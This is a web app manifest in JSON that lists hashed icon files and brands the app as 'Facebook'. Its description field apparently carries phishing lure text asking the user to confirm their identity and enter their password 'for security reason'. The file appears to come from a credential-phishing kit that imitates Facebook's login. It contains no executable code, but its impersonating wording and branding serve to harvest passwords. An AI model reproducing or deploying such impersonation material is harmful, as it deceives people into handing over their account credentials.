{
  "icons": [
    {
      "src": "/icon_180x180.4fee4dee7c12be4d63c732288ef8e730.png",
      "sizes": "180x180",
      "type": "image/png"
    },
    {
      "src": "/icon_167x167.6d2cf1e5451af01b4081f9b799ce0824.png",
      "sizes": "167x167",
      "type": "image/png"
    },
    {
      "src": "/icon_152x152.d477847527eb7ad1aa86878d59bd84e5.png",
      "sizes": "152x152",
      "type": "image/png"
    },
    {
      "src": "/icon_120x120.a7a31afee3e7f555dd301520aa9b454b.png",
      "sizes": "120x120",
      "type": "image/png"
    },
    {
      "src": "/icon_512x512.7822c67345375b0beed4fc080a801ee8.png",
      "sizes": "512x512",
      "type": "image/png"
    },
    {
      "src": "/icon_384x384.e9028b648d48f9658be4b98da76275b6.png",
      "sizes": "384x384",
      "type": "image/png"
    },
    {
      "src": "/icon_192x192.2bf926b2ae399e13197ee30b3229abd8.png",
      "sizes": "192x192",
      "type": "image/png"
    },
    {
      "src": "/icon_144x144.56b3e8098265a21fb0655626456ca79d.png",
      "sizes": "144x144",
      "type": "image/png"
    },
    {
      "src": "/icon_128x128.7436eee69bb5b593baa07bd68489c7b5.png",
      "sizes": "128x128",
      "type": "image/png"
    },
    {
      "src": "/icon_96x96.8f65b944fd57450ca11e16755ab378e5.png",
      "sizes": "96x96",
      "type": "image/png"
    },
    {
      "src": "/icon_72x72.83f0f5d5b1f7ba2784b4a197f7da6874.png",
      "sizes": "72x72",
      "type": "image/png"
    }
  ],
  "name": "Facebook",
  "short_name": "Facebook",
  "orientation": "portrait",
  "display": "standalone",
  "start_url": ".",
  "description": "Confirm your identity with Facebook, Enter your password for security reason (make sure your caps lock is off), Forgot your password?",
  "background_color": "#ffffff",
  "theme_color": "#ffffff"
}